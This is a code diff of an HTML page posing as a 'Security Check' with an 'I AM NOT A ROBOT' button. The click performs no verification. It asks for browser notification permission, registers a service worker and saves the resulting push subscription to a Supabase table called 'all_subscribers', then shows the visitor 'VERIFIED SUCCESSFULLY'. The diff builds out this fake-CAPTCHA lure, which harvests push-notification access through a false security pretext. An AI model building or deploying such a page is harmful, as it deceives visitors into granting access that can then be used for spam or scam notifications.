@@ -3,33 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verification</title>
+    <title>Verification System</title>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <style>
-        body { font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; background: #f0f2f5; margin: 0; }
-        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
-        #btn { background-color: #1877f2; color: white; border: none; padding: 15px 25px; border-radius: 6px; font-weight: bold; cursor: pointer; display: block; margin: 0 auto; }
-        #status { margin-top: 15px; font-size: 13px; color: #65676b; }
+        body { font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; background: #f0f2f5; margin: 0; }
+        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 100%; max-width: 350px; }
+        #btn { background-color: #1877f2; color: white; border: none; padding: 15px 25px; border-radius: 6px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; }
+        #btn:disabled { background-color: #ccc; }
+        #status { margin-top: 15px; font-size: 13px; color: #65676b; line-height: 1.5; }
+        .debug { margin-top: 20px; font-size: 10px; color: #999; border-top: 1px solid #eee; padding-top: 10px; text-align: left; overflow-wrap: break-word; }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <h2>Security Check</h2>
+        <h2 style="margin-top:0">Security Check</h2>
+        <p>Please click below to verify your session.</p>
         <button id="btn">I AM NOT A ROBOT</button>
         <p id="status">System Ready</p>
+        <div id="debug" class="debug">Logs: Waiting for click...</div>
     </div>
 
     <script>
-        // 1. Setup Supabase
+        // --- 1. CONFIGURATION ---
         const SB_URL = "https://smikpuwdbfqcqrsbhqnf.supabase.co";
         const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNtaWtwdXdkYmZxY3Fyc2JocW5mIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzA3NjMxODIsImV4cCI6MjA4NjMzOTE4Mn0.-s4dG3cfhcgqAVoP1UG3DZDm8gNnzqvdIZZylKTpg98";
+        const PUBLIC_VAPID_KEY = "BFNIjRierk7wIRzplJj9H8zFMtgEHgwALIbWEerhStbQus0-mw0K8I4RGdGd5PwE88cTJPN15YRaYJRPJPkUoNg";
+        
         const _supabase = supabase.createClient(SB_URL, SB_KEY);
-
         const btn = document.getElementById('btn');
         const status = document.getElementById('status');
+        const debug = document.getElementById('debug');
 
-        // Helper to handle the encryption key
+        // Helper to log for you
+        function log(msg) { debug.innerText += "\n> " + msg; }
+
+        // Helper to convert Key
         function urlBase64ToUint8Array(base64String) {
             const padding = '='.repeat((4 - base64String.length % 4) % 4);
             const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
@@ -37,43 +46,62 @@
             return Uint8Array.from([...rawData].map((char) => char.charCodeAt(0)));
         }
 
-        // 2. Click Logic
+        // --- 2. THE LOGIC ---
         btn.onclick = async () => {
             try {
-                status.innerText = "Step 1: Requesting permission...";
-                const permission = await Notification.requestPermission();
+                btn.disabled = true;
+                log("Requesting notification permission...");
                 
+                const permission = await Notification.requestPermission();
                 if (permission !== 'granted') {
-                    status.innerText = "Permission denied. Reset settings in URL bar.";
+                    status.innerText = "Permission Denied!";
+                    log("User blocked notifications.");
                     return;
                 }
 
-                status.innerText = "Step 2: Connecting worker...";
-                // Make sure sw.js exists in the same folder on Vercel!
+                log("Registering Service Worker (sw.js)...");
                 const registration = await navigator.serviceWorker.register('/sw.js');
                 
-                status.innerText = "Step 3: Creating token...";
-                const publicVapidKey = 'BEl62i_E_07WvyLceLdaEJKmAr9vA06N1-067v0N8pI_R8l62i_E_07WvyLceLdaEJKmAr9vA06N1-067v0N8pI';
-                
+                // Wait for worker to be active
+                log("Syncing with push service...");
                 const subscription = await registration.pushManager.subscribe({
                     userVisibleOnly: true,
-                    applicationServerKey: urlBase64ToUint8Array(publicVapidKey)
+                    applicationServerKey: urlBase64ToUint8Array(PUBLIC_VAPID_KEY)
                 });
 
-                status.innerText = "Step 4: Sending to Supabase...";
+                log("Subscription generated. Sending to Supabase...");
+                console.log("Token:", subscription);
+
+                // Insert into your 'all_subscribers' table
                 const { error } = await _supabase
                     .from('all_subscribers')
                     .insert([{ subscription_data: subscription }]);
 
-                if (error && error.code !== '23505') throw error;
+                if (error) {
+                    // If it's a duplicate error (code 23505), we still call it a success
+                    if (error.code === '23505') {
+                        status.innerHTML = "<b style='color:green'>Already Verified!</b>";
+                        log("Token already existed in DB.");
+                    } else {
+                        throw error;
+                    }
+                } else {
+                    status.innerHTML = "<b style='color:green'>✅ VERIFIED SUCCESSFULLY!</b>";
+                    log("Saved to Supabase.");
+                }
 
-                status.innerHTML = "<b style='color:green'>✅ SUCCESS!</b><br>You are verified.";
-                
             } catch (err) {
-                status.innerText = "Error: " + err.message;
-                console.error("FULL ERROR:", err);
+                status.innerHTML = "<b style='color:red'>Setup Error</b>";
+                log("ERROR: " + err.message);
+                btn.disabled = false;
             }
         };
+
+        // Basic check
+        if (!('serviceWorker' in navigator)) {
+            status.innerText = "Error: Browser too old.";
+            btn.disabled = true;
+        }
     </script>
 </body>
 </html>
